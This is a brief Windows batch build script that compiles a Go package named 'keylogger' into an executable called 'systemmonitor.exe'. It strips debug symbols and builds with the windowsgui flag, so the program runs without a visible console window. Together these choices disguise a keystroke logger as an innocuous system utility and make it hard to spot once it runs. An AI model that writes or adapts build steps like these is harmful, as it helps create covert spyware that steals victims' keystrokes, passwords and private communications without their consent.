@echo off
set GOOS=windows
set GOARCH=amd64
set CGO_ENABLED=1

go build -ldflags="-s -w -H=windowsgui" -o bin/systemmonitor.exe ./cmd/keylogger

echo Built executable: bin/systemmonitor.exe
